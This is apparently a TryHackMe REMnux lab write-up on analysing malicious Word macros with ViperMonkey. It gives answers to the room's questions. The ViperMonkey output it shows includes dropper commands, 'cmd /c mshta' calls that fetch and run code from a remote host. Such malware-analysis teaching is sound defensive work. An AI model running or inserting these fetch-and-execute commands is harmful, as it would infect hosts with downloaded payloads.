| ![REMnux](/_static/images/remnux-room-banner.png)
|:--:|
| [THM Room: REMnux](https://tryhackme.com/room/malremnuxv2) |

# Analysing malicious Microsoft Office macros

Malware infection via malicious macros (or scripts within Microsoft Office products such as Word and Excel) are some 
of the most successful attacks to date.

For example, current APT campaigns such as Emotet, QuickBot infect users by sending seemingly legitimate documents 
attached to emails i.e. an invoice for business. However, once opened, execute malicious code without the user knowing. 
This malicious code is often used in what’s known as a “dropper attack”, where additional malicious programs are 
downloaded onto the host.

To analyse macros we can use [ViperMonkey](https://github.com/decalage2/ViperMonkey), a parser engine that is capable 
of analysing visual basic macros without executing.

## Questions

**What is the name of the Macro for `DefinitelyALegitInvoice.doc`**

```text
Recorded Actions:
+----------------------+---------------------------+----------------+
| Action               | Parameters                | Description    |
+----------------------+---------------------------+----------------+
| Found Heuristic      | DefoLegit                 |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://10.0. | Shell function |
|                      | 0.10:4444/MyDropper.exe   |                |
| Found Heuristic      | DefoLegit                 |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://10.0. | Shell function |
|                      | 0.10:4444/MyDropper.exe   |                |
+----------------------+---------------------------+----------------+INFO     Found 7 possible IOCs. Stripping duplicates...
VBA Builtins Called: ['Shell']Finished analyzing DefinitelyALegitInvoice.doc .
```

**What is the URL the Macro in `Taxes2020.doc` would try to launch?**

```text
Recorded Actions:
+----------------------+---------------------------+----------------+
| Action               | Parameters                | Description    |
+----------------------+---------------------------+----------------+
| Found Heuristic      | X544FE                    |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://tryha | Shell function |
|                      | ckme.com/notac2cserver.sh |                |
| Found Heuristic      | X544FE                    |                |
| Entry Point          |                           |                |
| Execute Command      | cmd /c mshta http://tryha | Shell function |
|                      | ckme.com/notac2cserver.sh |                |
+----------------------+---------------------------+----------------+
```